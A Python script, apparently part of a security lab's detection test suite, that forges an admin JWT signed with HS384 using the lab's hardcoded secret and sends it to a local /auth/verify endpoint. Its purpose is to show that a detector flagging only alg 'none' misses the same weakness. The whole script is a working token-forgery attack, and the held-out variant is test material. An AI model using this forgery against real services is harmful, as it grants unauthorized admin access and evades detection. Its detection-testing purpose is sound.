#!/usr/bin/env python3
# Held-out variant of S4 (JWT Algorithm Confusion, T1212).
# Original: alg:none unsigned token. The S4 detector flags exactly that:
#   result=valid AND details.algorithm == "none".
# Variant : a token with alg=HS384, signed with the lab's hardcoded secret
# ("sentinelmesh-secret-key", from services/authservice/app.py). PyJWT 1.7.1
# with no algorithms restriction verifies it, so /auth/verify returns
# result=valid with details.algorithm=HS384. That is a successful forged
# verification the S4 detector does not catch (it only matches algorithm
# "none"), so this is a detection GAP. Same CVE-2022-29217 weakness, a
# different algorithm. Signing uses only the Python standard library.
import base64
import hashlib
import hmac
import json

import requests

SECRET = b"sentinelmesh-secret-key"  # hardcoded in authservice, known in this lab


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


print("=========================================")
print("S4 held-out variant - HS384 forged token")
print("=========================================")

header = {"alg": "HS384", "typ": "JWT"}
payload = {"user_id": 1, "username": "admin", "role": "admin"}
signing_input = f"{b64url(json.dumps(header).encode())}.{b64url(json.dumps(payload).encode())}"
sig = hmac.new(SECRET, signing_input.encode(), hashlib.sha384).digest()
token = f"{signing_input}.{b64url(sig)}"

try:
    r = requests.post(
        "http://localhost:5001/auth/verify",
        json={"token": token},
        timeout=5,
    )
    print("Status:", r.status_code)
    print("Body:", r.text)
except Exception as e:
    print(e)

print("\n[done] HS384 forged token sent to /auth/verify.")
